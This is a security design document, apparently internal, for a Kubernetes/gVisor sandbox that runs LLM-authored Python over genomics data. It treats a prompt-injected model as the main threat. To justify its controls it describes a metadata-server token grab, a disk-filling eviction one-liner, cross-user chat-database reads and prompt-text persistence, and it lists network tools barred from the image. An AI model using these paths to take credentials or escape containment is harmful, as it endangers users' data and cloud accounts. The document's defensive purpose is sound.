# Code execution: threat model and security design

Status: **design of record**. Every section ends with a decision. The sandbox
implementation tasks (`genetics-results-suite-4h6.6` through `.10`, `.14`, `.15`, `.16`)
implement what is written here; they do not re-open it. Where a decision was a judgement call, the
alternative and its trigger condition are recorded so a later change is a decision, not a
rediscovery.

**Scope.** The model authors Python; that Python runs somewhere and reads suite data. This
document decides *where* it runs, *what it can reach*, *what credential it carries*, and
*who can invoke it*. It does not cover the SDK's own API surface (`4h6.11`) except where
that surface becomes a security boundary — see "Handoffs to other tasks".

**Threat actors, in the order they matter:**

1. **A prompt-injected model.** Tool results and user-supplied attachments enter the
   model's context. A hostile string in a phenotype description, a Europe PMC abstract or
   an uploaded TSV can cause the model to author a malicious script. This is the *primary*
   actor: it needs no attacker access to the cluster and no compromised account.
2. **An authorized user acting maliciously.** Access is gated by the oauth2-proxy
   allow-list (named addresses plus `broadinstitute.org` / `finngen.fi` domains), so this
   is an insider, not an anonymous attacker.
3. **Anyone who can reach mcp-server.** mcp-server is *not* behind oauth2-proxy and accepts
   four bearer paths (`MCP_API_KEY`, Google Identity Tokens, per-user chat API tokens,
   Keycloak OAuth 2.1 tokens from registered third-party clients). Its reachability is
   materially broader than the browser's, which is why section 5 exists.

---

## 1. Why in-process execution is unacceptable

The mechanism already exists in the codebase and is switched off. It is switched off for
good reasons, and those reasons are the requirements list for everything below.

**chat-backend runs as root.** `docs/project-spec.md` (Security section) records that
`results-api`, `chat-backend` and `mcp-server` "still run as root because they raise
`ulimit`, shell out to `gcloud`, cache tabix indexes, or own root-owned files on the
`chat-data` PVC". chat-backend additionally sets `fsGroup: 1032` so pre-existing SQLite
files stay writable once `CAP_DAC_OVERRIDE` is dropped. Model-authored code executing
inside that pod is uid 0 with a writable `chat-data` PVC mounted at `/data`. That PVC
holds `chat_history.db` (every conversation in the deployment, all users) and
`llm_config.db` (**user-authored prompt text**, which is fed back into the system prompt).
A script running there can read every other user's conversations and can *write* prompt
text that will later be prepended to somebody else's chat — a persistence primitive, not
just a read.

**The environment allow-list is scar tissue, not caution.** `sandbox_tools.py` line 21
carries its own history in a comment:

> Environment passed to model-authored scripts, as an allow-list. This was previously a
> deny-list of key prefixes, which missed `INTERNAL_API_SECRET` (the credential that
> authenticates as "mcp-tool" to results-api) along with the internal service URLs — every
> variable nobody thought to add stayed exposed. Anything not named here is dropped.

So an earlier version of exactly this feature leaked the suite's internal service
credential into model-authored scripts. The allow-list (`PATH`, `HOME`, `LANG`, `LC_ALL`,
`TMPDIR`, `TZ`, `TERM`, `PWD`, `SHELL`, `USER`) is the correct fix for the *leak*, but it
is a fix applied inside the same process, same uid, same network namespace and same mounted
PVC as the credential it is hiding. `_validate_path` (line 26) exists for the same reason:
path traversal out of the allowed directories was already a live concern in the in-process
design. Both are string-level defences against code that has full process privileges — the
script can call `os.environ` from `/proc/self/environ` of any sibling, or simply open
`/data/chat_history.db` directly, and neither control applies.

`execute_script` (line 104) allows `python3`, `Rscript` **and `bash`**, passes the script on
stdin, and enforces nothing beyond a 30-second `asyncio.wait_for`. There is no memory cap,
no pid cap, no output cap and no network restriction whatsoever.

**Current production state (verified).** `ENABLE_SCRIPT_EXECUTION` is `"false"` in
`k8s/deployments/chat-backend.yaml` (line 119) *and* in `k8s/deployments/mcp-server.yaml`
(line 65). chat-backend has `SUBAGENT_ALLOWED_PATHS: "/data"` — the chat-data PVC mount
point — so if the flag were flipped today, model-authored scripts would get root-owned
read/write access to every conversation in the deployment. mcp-server has
`SUBAGENT_ALLOWED_PATHS: ""`, which `_validate_path` treats as "no allowed paths
configured" and rejects.

**Decision.** In-process execution stays permanently disabled.
`ENABLE_SCRIPT_EXECUTION=false` remains in both deployment manifests and is not a rollout
toggle for this feature. Code execution moves to a separate pod, in a separate node pool,
with a separate identity, reached over HTTP from chat-backend only. `sandbox_tools.py`
keeps `_validate_path` — whose *logic* `read_artifact` reuses (`4h6.15`), but inside the
sandbox pod and against a `/scratch/<id>/artifacts` allow-list, **never** against
chat-backend's `SUBAGENT_ALLOWED_PATHS`; see the `read_artifact` subsection in section 6.
`execute_script` is not the execution path and gains no new callers.

---

## 2. Isolation boundary

The **suite baseline** referred to in the table below is what the suite's *own* service
containers set: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]` and
`RuntimeDefault` seccomp, with `db-api` (uid 10001) and `bff` (uid 1000) additionally
`runAsNonRoot`. It is **not** a cluster-wide property and never was: eight third-party and
support workloads set none of it, and `auth-gateway` adds `CHOWN`/`SETUID`/`SETGID` back
on top of its drop-ALL, so even `drop: ["ALL"]` is not flatly true of the containers that
do set it. `docs/project-spec.md` → Security holds the authoritative per-workload list —
do not duplicate that enumeration here. The sandbox must exceed this baseline, because it
is the only workload in the cluster that executes attacker-influenceable code *by design*.

### Decisions

| Control | Decision | Why |
|---|---|---|
| Base image | `gcr.io/distroless/python3-debian12:nonroot`, multi-stage with a venv built in a `python:3.12-slim` stage | No shell, no package manager, no `curl`. `execute_script`'s `bash` interpreter is not merely un-allow-listed, it is absent from the filesystem. |
| uid / gid | `runAsNonRoot: true`, `runAsUser: 65532`, `runAsGroup: 65532` | The distroless `nonroot` identity. Deliberately not 1032/1000/10001 — none of the existing suite uids, so no accidental filesystem-permission overlap if a volume is ever attached by mistake. |
| `readOnlyRootFilesystem` | `true` | Exceeds the cluster baseline. No suite container currently sets it. |
| Capabilities | `drop: ["ALL"]`, no `add` | Matches baseline. |
| `allowPrivilegeEscalation` | `false` | Matches baseline. |
| Seccomp | `RuntimeDefault` | Matches baseline; see the rejection note below. |
| Service account | dedicated KSA `sandbox`, **no** Workload Identity binding, `automountServiceAccountToken: false`, **on a node pool in `GKE_METADATA` mode with a dedicated node service account** | **Critical, and the node pool is load-bearing — see the node-pool spec below.** Every other pod uses `serviceAccountName: genetics-suite`, which `terraform/iam.tf` binds via Workload Identity to a GSA holding `roles/bigquery.dataViewer`, `bigquery.jobUser`, `storage.objectViewer` and `logging.viewer`. If the sandbox used that KSA, a three-line script hitting the metadata server would obtain direct BigQuery and GCS credentials and every other control in this document would be decoration. The guarantee that no usable GCP credential is reachable is **`GKE_METADATA` mode on the node plus no Workload Identity binding for the KSA** — those two together. `automountServiceAccountToken: false` is not part of that guarantee: it defends the **Kubernetes API server** (no projected KSA token in the container, so no `kubectl`-equivalent access) and defends nothing whatsoever against the GCP metadata server, which is reached over the network and needs no mounted token. |
| Volumes | exactly one `emptyDir`: `/scratch` (`sizeLimit: 512Mi`). **No PVC, ever. No pod-level `/tmp`.** | `chat-data` is the crown jewels (section 1). A pod-level `/tmp` was specified in an earlier draft and is **removed**: it outlives an execution, and with `replicas: 1` and `concurrency: 1` successive users are *guaranteed* to share the same pod, so a shared `/tmp` is a sequential cross-conversation channel (see the Writable-paths row and section 6.4). Temp space comes out of the per-execution directory instead; the 512Mi `sizeLimit` is therefore the combined artifact-plus-temp budget, which makes supervisor-enforced sub-quotas mandatory — see "Staying under `sizeLimit`" below. |
| Writable paths | `/scratch/<execution-id>/` only, including `/scratch/<execution-id>/tmp`. `TMPDIR`, `HOME`, `MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` all point inside it. | One directory per execution, created before the fork. Everything in it is deleted on completion, or at a 15-minute TTL if the execution never completes — with the single exception of `/scratch/<execution-id>/artifacts`, which is retained for 15 minutes after completion so `read_artifact` has something to return (see the `read_artifact` subsection in section 6, which is where that lifecycle is settled). Nothing writable is shared between executions. With `readOnlyRootFilesystem: true` and no `/tmp` volume, `/tmp` is not writable at all, so a library that hardcodes it fails loudly at build/test time rather than quietly acquiring a shared channel — which is the outcome we want. If some dependency turns out to require a writable `/tmp` and cannot be redirected, adding the volume back is a **recorded degradation**, not a free fix, and it comes with a hard obligation: the supervisor wipes `/tmp` completely immediately before every fork, so no bytes survive from the previous execution. The supervisor also wipes, at startup, any `/scratch` entry that does not belong to a live or still-retained execution — a crash mid-execution must not leave a readable directory behind. |
| Memory | `requests: 1Gi`, `limits: 3Gi` | Enough for a polars aggregation over a realistic credible-set pull. The cgroup OOM kill is the enforcement. **It is not a guarantee that the child dies and the supervisor survives** — the kernel picks by `oom_score`, which is a heuristic over RSS, and gVisor changes the accounting because the sentry holds memory on the application's behalf. So this is made deterministic instead: the supervisor sets its own `oom_score_adj` low (e.g. `-500`) and the child's high (e.g. `+500`), and sets `RLIMIT_AS` on the child at a value that leaves the supervisor explicit headroom under the 3Gi cgroup limit. The child hitting `RLIMIT_AS` gets a clean `MemoryError` inside its own process, which is a better failure than an OOM kill in either direction. |
| CPU | `requests: 500m`, `limits: 1500m` | The mining cap. Bounded well under the sandbox node's allocatable so the supervisor stays schedulable. |
| pids | `pod_pids_limit: 256` in the sandbox node pool's `kubelet_config`, plus a child pid budget **meaningfully below** 256 | Fork-bomb containment. Per-pod pid limits are a kubelet setting, not a pod-spec field, which is a further reason the sandbox needs its own node pool. **`RLIMIT_NPROC` alone does not work as specified in an earlier draft:** it is a limit per *real uid* across the pid namespace, and the supervisor runs as the same uid 65532 as the child, so a child forking to its `RLIMIT_NPROC` also prevents the *supervisor* from forking — the fork bomb takes out the supervisor instead of being contained. Two ways to fix it, and `4h6.7`/`4h6.14` must pick one explicitly: (a) run the child as a **second non-root uid** distinct from the supervisor's, which restores `RLIMIT_NPROC` as a genuine per-execution control; or (b) keep one uid and enforce the pid budget from the supervisor by watching the child's process group and killing it above a threshold well under 256, treating `RLIMIT_NPROC` as advisory only. (a) is preferred; it costs one extra uid in the image and a `chown` of `/scratch/<execution-id>` to the child uid before the fork — and it has the side benefit of putting the supervisor's memory and the token file out of the child's same-uid reach (section 4, token delivery). It is **not** free of ownership consequences, though: see "Permission contract" below, which `4h6.7`/`4h6.14` must implement in full if they take (a). |
| Ephemeral storage | `requests: 1Gi`, `limits: 2Gi` | Backstop under the `emptyDir` `sizeLimit`s. |
| Wall clock | **60s default, 120s hard ceiling**, not overridable by the model | The current in-process timeout is 30s, which is too short once one script replaces a chain of tool calls; the existing `terminationGracePeriodSeconds` comment in chat-backend.yaml records that a chat turn "routinely runs 1-3 minutes", so 120s is the largest value that does not make the sandbox the dominant term in turn latency. |
| Output cap | 64 KiB returned to the model (first 32 KiB + last 32 KiB with an explicit elision marker); the reader stops at 8 MiB from the pipe and kills the child | Head-and-tail because the model needs the traceback, which is at the tail. The 8 MiB pipe cap stops `while True: print(...)` from consuming the supervisor's memory before the wall clock fires. The 64 KiB figure is a *context* decision as much as a security one — the epic's justification is the context-accumulation curve (39k → 117k tokens), and an unbounded stdout would defeat it. |
| Concurrency | **1 execution per pod**, queued beyond that | Measured peak is 23 chat turns/hour (one every ~2.6 minutes), so queueing costs nothing. In exchange it removes cross-user co-tenancy *inside* the pod entirely: two concurrent children would share a pid namespace and `/proc`, and there is no per-fork isolation available to fix that. |
| Replicas | 1 | Peak 23 turns/hour, p95 8, mean 3. Do not build for concurrency that does not exist. |

### Permission contract for the second-uid option

Option (a) of the pids row — a distinct child uid — is preferred, and it silently breaks two
things unless the ownership rules are stated. Both have an obvious wrong fix that an
implementer will reach for under time pressure, which is why the contract is written out
rather than left to be derived.

**What breaks.** With `/scratch/<id>` chown'd to the child uid, the artifacts the child
writes are owned by the **child**, while the **supervisor** is the process that serves
`read_artifact` and runs the 15-minute reaper — under any restrictive umask it cannot read
them. Symmetrically, the mode-0600 token file the supervisor writes (section 4, token
delivery) is owned by the **supervisor** and is unreadable by the **child**, which is the
process that needs it. Section 4 justifies the file against the shared-uid option and never
states this.

**The wrong fixes, named so they are recognisable in review:** `chmod 0777` on the artifacts
directory (which hands a future second child a shared writable path, re-opening the
cross-execution channel section 6.4 closed), or quietly falling back to a shared uid —
which withdraws the pid control *and* the `/proc/<pid>/environ` protection that were the
entire reason for choosing (a).

**The contract:**

- A **shared gid `65532`**, which both the supervisor uid and the child uid belong to. The
  uids differ; the gid does not. This is what carries access in both directions.
- `/scratch/<id>` is mode **`0750`**, owned **`child:65532`** — child owns it (so
  `RLIMIT_NPROC`-era per-uid reasoning and write access hold), supervisor reaches it through
  the group, nothing else reaches it at all.
- `/scratch/<id>/artifacts` and its contents are mode **`0640`** (directory `0750`), group
  `65532`, so the supervisor can read and reap what the child wrote without any world bit
  being set. The SDK sets this explicitly rather than relying on the child's umask.
- The token file is written by the supervisor, then **`chown`'d to the child uid at mode
  `0400`** *before* the fork. The child can read it once and unlink it; the supervisor never
  needs to read it back.
- Under option (b) — one shared uid — none of this applies; the trade there is the loss of
  the `/proc/<pid>/environ` protection recorded in section 4.

### Staying under `sizeLimit`: the supervisor enforces sub-quotas, the kubelet must never fire

Two decisions elsewhere in this document interact badly and the interaction has to be
closed explicitly. Removing the pod-level `/tmp` made 512Mi the **combined** artifact-plus-
temp budget, while `read_artifact` (section 6) retains **every** execution's `artifacts/`
for 15 minutes after completion. Exceeding an `emptyDir` `sizeLimit` does not fail the
write — the **kubelet evicts the pod**. That kills the in-flight script *and* destroys every
retained artifact from every earlier execution in the window. A script can trigger it
deliberately with `open('/scratch/<id>/tmp/x','wb').write(b'\0'*512*1024*1024)`: a
self-inflicted denial of service against the next several turns, which neither the volumes
row nor the retention rule anticipated on its own.

**Decision: supervisor-enforced sub-quotas, well under `sizeLimit`.** Specifically:

- A **per-execution artifact quota of 64Mi** on `/scratch/<id>/artifacts`, enforced by the
  supervisor. Over quota is a clean error returned to the model, not an eviction.
- A **per-execution total quota** on all of `/scratch/<id>` (artifacts + temp + inputs +
  caches), enforced the same way, sized so that one execution plus the full retained set
  cannot approach 512Mi.
- An **aggregate retained-artifact ceiling** across all retained `artifacts/` directories,
  with **oldest-first eviction** when a new execution would breach it — so retention
  degrades gracefully instead of accumulating until the kubelet intervenes.
- Enforcement is by the supervisor polling actual usage, not by trusting the child: the
  child writes directly to the filesystem and there is no syscall interposition available.
  Poll interval must be short enough that a fast writer is killed before 512Mi (the child
  is CPU-limited to 1500m, which bounds how fast it can get there).

**Why not the alternative of putting `artifacts/` on a second small `emptyDir`.** It reads
like the cleaner fix and it does not work: `sizeLimit` eviction is a **pod-level** action.
A script that fills the temp `emptyDir` still gets the pod evicted, and the second
`emptyDir` — being pod-local too — dies with it. Separating the volumes changes which
volume is over budget, not whether the pod survives, so it protects neither the retained
artifacts nor the in-flight script. Only a quota that keeps usage below `sizeLimit` in the
first place does that, which is why the supervisor has to hold the budget.

### gVisor (GKE Sandbox): adopted, on its own node pool

**Decision: yes, and this settles the node-pool question rather than complicating it.**

The argument against is real: GKE Sandbox cannot be enabled on an existing pool's workloads
selectively — it requires a pool created with `sandbox_config { sandbox_type = "gvisor" }`,
which is a *dedicated* pool, and gVisor's syscall interception costs measurably on the
`mmap`/`futex`-heavy paths that numpy and polars live on.

The argument for is decisive. Every other control in this document assumes the container
boundary holds, and that boundary is a shared Linux kernel on a node — and on the existing
pool that is a node whose `node_config` carries the `cloud-platform` OAuth scope and the
`genetics-suite` service account. A kernel LPE from a container that already has
arbitrary code execution — precisely our situation — reaches the node. gVisor is the only
control in the catalogue that addresses that, and the population of people who can trigger
script authoring includes anyone who can get a string into the model's context.

The cost argument inverts on inspection. `docs/project-spec.md` ("Node pool sizing")
records that the pinned 2 × `e2-standard-4` pool *already* overshoots one node on both axes
during a full deploy (3951m vs 3920m allocatable CPU, 13.60 vs 12.97 GiB), and warns
explicitly that "raising any deployment's requests, or adding a service, can re-break
this". Putting the sandbox on the existing pool re-breaks it. Putting it on its own pool
leaves the 2-node surge budget **untouched** — the sandbox contributes 0m and 0 GiB to it.

**Specification for `4h6.10`:**

- New `google_container_node_pool` `sandbox-pool`, `min_node_count == max_node_count == 1`
  (the pinning rationale from the main pool applies identically: an autoscaler with room to
  move evicts pods, and here it would kill in-flight scripts).
- `machine_type = "e2-standard-2"`, `sandbox_config { sandbox_type = "gvisor" }`,
  `kubelet_config { pod_pids_limit = 256 }`.
- **`node_config.workload_metadata_config { mode = "GKE_METADATA" }`, unconditionally.**
  This is not optional and it is not a copy of the primary pool's arrangement.
  `terraform/gke.tf` (primary pool, ~lines 57-72) sets `workload_metadata_config` inside a
  `dynamic` block gated on `var.manage_iam`, and its `service_account` likewise falls back
  to `null` when `manage_iam = false` and `node_service_account` is empty. A new pool
  written from a bare spec of `machine_type` + `sandbox_config` + `kubelet_config` inherits
  the provider defaults for everything else, and those defaults are exactly wrong here:
  `workload_metadata_config` unset means **`GCE_METADATA`**, which exposes the raw GCE
  metadata server to every pod on the node, and `service_account` unset means the **Compute
  Engine default service account**, which in most projects carries `roles/editor`. A script
  then does one HTTP GET to
  `169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` and holds a
  project-level access token. Note what this defeats: Workload Identity is *irrelevant* in
  `GCE_METADATA` mode, because in that mode the identity handed out is the node's and is
  not derived from the KSA at all — "the sandbox KSA has no WI binding" stops being a
  statement about anything.
- **`GKE_METADATA` requires cluster-level Workload Identity, so the cluster resource must
  change too — this is not optional and it is not a detail.**
  `workload_metadata_config { mode = "GKE_METADATA" }` is rejected by the GKE API unless
  the *cluster* has a `workload_pool` configured. In `terraform/gke.tf`,
  `google_container_cluster.primary`'s `workload_identity_config` is itself inside a
  `dynamic` block with `for_each = var.manage_iam ? [1] : []`. So under
  `manage_iam = false` there is **no `workload_pool`**, and an unconditional
  `GKE_METADATA` node pool fails **at apply, not at plan**. `4h6.10` must therefore also
  make the cluster's `workload_identity_config` **unconditional** —
  `workload_pool = "${var.project_id}.svc.id.goog"` always, outside the `dynamic`. That is
  an **in-place cluster update**: it does not recreate the cluster, and it does not change
  any existing node pool's metadata mode (each pool's `workload_metadata_config` is
  independent, and the primary pool's stays exactly as it is today).

  Why this is called out so heavily: the apply-time failure has a cheap wrong fix. An
  implementer who hits `Workload Identity is not enabled` on `terraform apply` will reach
  for the obvious escape — re-gate the sandbox pool's `workload_metadata_config` on
  `var.manage_iam`, matching the primary pool — which reintroduces the `GCE_METADATA` hole
  verbatim in exactly the deployment where it is most dangerous.
- **A dedicated node service account, mandatory under `manage_iam = false`.** Not
  `genetics-suite` (that GSA holds the BigQuery, GCS and logging roles the sandbox must
  never reach), and not the Compute Engine default. A new GSA carrying only what a node
  needs — `roles/logging.logWriter`, `roles/monitoring.metricWriter`,
  `roles/monitoring.viewer`, `roles/stackdriver.resourceMetadata.writer`,
  `roles/artifactregistry.reader` — and nothing else. When `manage_iam = false` terraform
  cannot create it, so `node_service_account` becomes a **required input** in that mode:
  validated non-empty and failing the plan if absent, **never** falling back to `null` the
  way the primary pool's does. `null` there means the Compute Engine default SA, which in
  most projects carries `roles/editor`.
- **Explicit `oauth_scopes`**, not the provider default, and **the rationale is narrower
  than it looks.** An earlier draft called node scopes "the second bound on any token the
  metadata server would mint". In `GKE_METADATA` mode that is **false**: tokens handed to
  pods are minted for the Workload-Identity-bound GSA through the IAM Credentials API and
  are not scope-limited by the node at all, and pods cannot reach the node SA's own token
  in that mode. Node scopes bound only the node SA's own token. So scope reduction is
  defence-in-depth for the **`GCE_METADATA` misconfiguration case** (and for a gVisor
  escape reaching the node, residual #1) — it is *not* load-bearing for the pod-facing
  guarantee, and nothing in this document may be built on the assumption that it is.

  **Name the scopes explicitly; "scope down from `cloud-platform`" with no value will
  break the pool.** Artifact Registry image pulls go through the storage API and need
  `devstorage.read_only` — `roles/artifactregistry.reader` on the SA is *not* sufficient
  on its own. The minimum set:
  `https://www.googleapis.com/auth/devstorage.read_only`, `logging.write`, `monitoring`,
  `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append`.
- **The `manage_iam = false` deployment is the dangerous one.** The IAM resources in
  `terraform/iam.tf` are gated `count = var.manage_iam ? 1 : 0`, and the primary pool's
  `workload_metadata_config` is gated on the same variable — so in a deployment where a
  platform team owns IAM and `manage_iam` is false, the bad defaults above are precisely
  what applies.

  **The review gate is not a plan inspection.** An earlier draft said `4h6.10` "fails
  review if a `terraform plan` under `manage_iam = false` produces a sandbox pool without
  `GKE_METADATA`". That gate passes cleanly and catches nothing: the pool *does* plan with
  `GKE_METADATA`; what is missing is the cluster's `workload_pool`, and that only surfaces
  at apply. `4h6.10` instead fails review unless **all three** of the following hold by
  inspection of the terraform source:
  1. `google_container_cluster.primary.workload_identity_config` is unconditional — not
     inside any `dynamic` or `count` gated on `var.manage_iam`.
  2. The sandbox pool's `workload_metadata_config { mode = "GKE_METADATA" }` is likewise
     unconditional.
  3. `var.node_service_account` is validated non-empty whenever `manage_iam = false`, with
     no `null` fallback path reachable for the sandbox pool.

  A `terraform apply` in a non-production project with `manage_iam = false` is the
  confirming test, because apply is where this class of error appears.
- GKE automatically taints gVisor nodes `sandbox.gke.io/runtime=gvisor:NoSchedule`, so no
  suite workload can drift onto it; the sandbox Deployment sets the matching toleration and
  `runtimeClassName: gvisor`.
- `node_config.machine_type` is ForceNew on `google_container_node_pool` — this is a *new*
  pool resource, not an edit to the existing one, so no destroy/recreate of the primary
  pool is involved.
- Steady-state surge total for the main pool is unchanged. Re-derive nothing.

**Judgement call flagged for the user:** this is roughly one extra small always-on node.
Against ~1,842 USD of measured LLM spend it is minor, but it is a standing cost for a
threat (kernel escape) that has not occurred. The cheaper alternative — sandbox on the
existing pool with `RuntimeDefault` seccomp only — requires re-deriving the surge budget
against a pool that is already over, and accepts kernel-boundary-only isolation. If cost
wins, that is the fallback; nothing else in this document changes.

### Rejected controls, with reasons

- **Custom seccomp profile.** A tighter-than-`RuntimeDefault` profile needs a node-local
  file distributed by DaemonSet and referenced via `localhostProfile`, and the syscall set
  CPython + numpy + polars + matplotlib actually touch is large and changes with wheel
  versions. The realistic outcome is latent breakage that gets "fixed" by loosening the
  profile until it is `RuntimeDefault` again. `RuntimeDefault` already blocks the
  escape-relevant set (`add_key`, `keyctl`, `bpf`, `mount`, `ptrace` beyond self, namespace
  `clone` flags), and gVisor supersedes the marginal gain.
- **In-interpreter sandboxing** (`RestrictedPython`, `sys.addaudithook`, import hooks).
  Not a security boundary and will not be presented as one. CPython has no supported
  in-process confinement; every published bypass chain (`__subclasses__`, `ctypes`, frame
  walking) works. The boundary is the pod, the network policy and the kernel — full stop.
- ~~**`hostAliases` instead of DNS.**~~ **Not rejected — adopted as the v1 default.** See
  section 3, "On DNS". An earlier draft kept kube-dns egress and booked DNS tunnelling as
  a low-bandwidth residual; that arithmetic was wrong and the decision is reversed.

### Where the image lives

**Decision:** a new `sandbox/` build context in **this** repo (genetics-results-suite),
built by `scripts/build-all.sh` and `scripts/build.sh` alongside the existing `monitor` and
`keycloak` local contexts. The SDK is pip-installed from genetics-mcp-server at build time.
Rationale: the hardening (base image, uid, absent shell) is deployment policy and must stay
consistent with the manifests in `k8s/`, which live here; and this repo is the spec of
record for cross-repo concerns.

### As built (`4h6.6`) — what shipped, and the two places it departs from the above

`sandbox/` in this repo: `Dockerfile`, `requirements.txt` (pinned analysis deps),
`build-checks.py` (build-time assertions), `prewarm.py`, `schema/` and `stubs/`. Built by
`build-all.sh` and by `build.sh sandbox`, tagged from this repo's HEAD like `monitor` and
`keycloak`, with the genetics-mcp-server commit recorded in the image label
`com.fulltiltgenomics.genetics-mcp-server-ref` because the tag alone does not identify the
contents.

**Deviation 1 — the builder is `python:3.11-slim`, not `python:3.12-slim`.**
`gcr.io/distroless/python3-debian12:nonroot` ships **CPython 3.11.2** (bookworm's system
python), verified by running it. The final stage runs *that* interpreter against the venv's
site-packages, so a 3.12 venv would place cp312-tagged native wheels — numpy, scipy, polars
and matplotlib all ship them — in front of a 3.11 interpreter and fail at import. The
builder must track the base image's minor version. The decision's intent (venv built in a
slim stage; no compiler, pip or package manager in the final image) is unchanged.

**No pip, and it took a second pass to be true.** `python -m venv` seeds pip and
setuptools into the venv, and the final stage copies the venv verbatim, so the first
build of this image shipped `pip 24.0` and `setuptools 79.0.1`: `python3 -m pip install`
ran inside the sandbox, and the assertion that was supposed to catch it walked only the
distroless rootfs — never `/opt/venv`, which is where they were. `sandbox/prune_venv.py`
now deletes pip, setuptools, `pkg_resources`, `_distutils_hack` and the whole of
`/opt/venv/bin` in the builder stage, and the assertion walks `/dl`, `/opt/venv` and
`/out` and additionally proves the modules are not importable. Nothing needed
`/opt/venv/bin`: the entrypoint is `/usr/bin/python3` with `PYTHONPATH` at
site-packages, and the venv's own `bin/python3` was a dangling symlink to the builder's
interpreter in any case.

**Deviation 2 — the SDK is installed `--no-deps`, and only its import closure ships.**
"The SDK is pip-installed from genetics-mcp-server at build time" and "no
`google-auth`-based client in the image" (section 3(c)) cannot both hold if
genetics-mcp-server's own dependency set is resolved: that set contains
`google-auth[requests]`, plus anthropic, openai and fastapi. The image therefore installs
the package with `--no-deps` from a staged checkout and declares the SDK's real runtime
closure itself in `sandbox/requirements.txt` (numpy, scipy, polars, matplotlib, httpx —
`python-dotenv` was needed only while `config/settings.py` was in the closure, and went
with it; see below). `build-checks.py` fails the build if a
`google-auth`/`google-cloud` distribution reappears by any route, and separately if
`import google.auth` succeeds. The cost is that the closure is declared in two places and
can drift: an SDK that grows a new dependency fails the build's import check rather than
silently shipping.

`--no-deps` bounds the *distributions*; it does not bound the *files*, and pip installs
the whole `genetics_mcp_server` package — 48 modules, of which the SDK imports 11. The
other 37 (chat_api, llm_service, mcp_server, mcp_proxy, subagent, `config/`, `auth/`,
`routers/`, `db/`, `skills/`, `scripts/`) are unimportable in the sandbox for want of fastapi and
anthropic, but that is the wrong property to rely on: a prompt-injected script *reads*
files, and `auth/core.py` is the `X-Goog-Authenticated-User-Email` model every service in
the suite trusts. `sandbox/prune_venv.py` therefore cuts the installed package to an
explicit `SDK_ALLOWLIST`, and `build-checks.py` asserts the surviving set *equals* it, so
the surface grows deliberately rather than with the next `pip install`.

**`config/settings.py` used to be in the closure; it no longer is** (`l41`). It reached
the image because `sdk/client.py` imports `tools/executor.py`, whose module-level `from
genetics_mcp_server.tools.uniprot import UniProtClient` pulled `from
genetics_mcp_server.config.settings import Settings`, and `ToolExecutor.__init__` called
`get_settings()` at construction. So the sandbox shipped a file naming
`INTERNAL_API_SECRET`, `ANTHROPIC_API_KEY`, `BIGQUERY_API_URL`, `ADMIN_USERS`,
`ALLOWED_EMAILS`, `GOOGLE_TOKEN_AUDIENCE` and the on-disk paths of the two SQLite
databases — names, never values, but names are the internal model an attacker would
otherwise have to guess. Both edges were cut in genetics-mcp-server: uniprot's `Settings`
import is behind `if TYPE_CHECKING` with a string annotation, and the executor resolves
settings through `_resolve_settings()` at first use, falling back to a frozen
`_PrunedInstallSettings` carrying `Settings`' own defaults when the module is absent —
which is exactly this image, and which is correct there because the sandbox pod holds no
internal secret (`4h6.9`). The secret is hard-coded empty in that fallback rather than
read from the environment, so the variable's *name* does not come back into the image
through the replacement. `tests/test_sdk_import_closure.py` in genetics-mcp-server pins
the 11-module closure so it cannot regrow silently; `SDK_ALLOWLIST` here is the
build-time backstop.

**`tools/executor.py` still ships, and remains a residual disclosure.** `sdk/client.py`
imports `ToolExecutor` directly and every SDK method delegates to it, so it cannot leave
the closure without a rewrite of the SDK. With it ship the f-string SQL interpolation
sites recorded as blocking `4h6.14`, and these environment-variable names — re-derive this
list by grepping the eleven closure modules, not by trusting it:

| name | where | kind |
|---|---|---|
| `GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL` | `tools/executor.py`, the `base_url` / `public_url` / `bigquery_url` properties | live `os.environ.get` |
| `PERPLEXITY_API_KEY`, `TAVILY_API_KEY`, `LITERATURE_SEARCH_BACKEND` | `tools/executor.py`, the literature-search tools | live `os.environ.get` |
| `INTERNAL_API_SECRET` | `sdk/__init__.py` and `sdk/client.py` docstrings/comments; `stubs/genetics.pyi`, `stubs/client.pyi`, which the final stage copies to `/genetics/sdk/` | prose only, no read |

The three endpoint names are a map of the injection sites in the one backend the sandbox
may reach. The three literature-search names are live reads whose values the sandbox pod
does not hold; removing them would change the behaviour of those tools and is out of scope
here.

`INTERNAL_API_SECRET` in the SDK docstrings and the shipped stubs is an **accepted
residual**, not an oversight (`4h6.13` recorded the exfiltration note in `client.pyi` as
operational knowledge the agent is meant to read). It is kept, named, for three reasons.
The stubs exist to be read by the model writing sandbox code, and "endpoint URLs are not
configurable because the client attaches `INTERNAL_API_SECRET` to every request" is the
only form of that warning that lets the reader connect it to the deployment's actual
configuration; genericised to "an internal credential" it stops being checkable and starts
being ignorable. It also discloses nothing the reader cannot already derive: the SDK it is
being handed authenticates on its behalf, and the header rides on every request it makes.
And the sandbox pod does not hold the value (`4h6.9`), so `os.environ.get("INTERNAL_API_SECRET")`
inside the sandbox returns nothing — the name is not a key to anything present. This is a
different calculus from `config/settings.py`, which named a dozen *unrelated* variables and
so handed over the shape of the whole internal surface rather than the one credential the
caller is already using.

What is *not* in the residual list: `config/settings.py` and `auth/core.py` are both out of
the closure and neither ships, so no LLM provider key, allow-list, OAuth audience or
database path is named anywhere in the image. No values of any kind ship — every entry
above is a name.

**Build-time assertions** (`sandbox/build-checks.py`, run in the builder stage against the
artefacts the final stage copies, because the final stage has no shell to check anything
in) — ten of them: `/etc/nsswitch.conf` present with `files` before `dns` (section 3(b));
no shell, package manager, `pip`, `curl`, `wget`, `nc` or `ssh` anywhere in `/dl`,
`/opt/venv` or `/out`; pip/setuptools/`pkg_resources` not importable; no `google-auth`
distribution in the venv and `import google.auth` failing; any native object carrying a
GCE metadata client answered by a literal-IP `GCE_METADATA_HOST` in the final stage
(section 3(c), below); the surviving `genetics_mcp_server` modules equal to the SDK
allow-list; no `PLACEHOLDER*` file in the staged `schema/` or `stubs/`; every analysis
library **and `genetics_mcp_server.sdk`** importing cleanly; `passwd` carrying both uids
on the shared gid; the matplotlib font cache baked. The probes run
`python3 -S` with `PYTHONPATH` at site-packages rather than `/opt/venv/bin/python3`,
which no longer exists and which was never how the final image runs anyway.

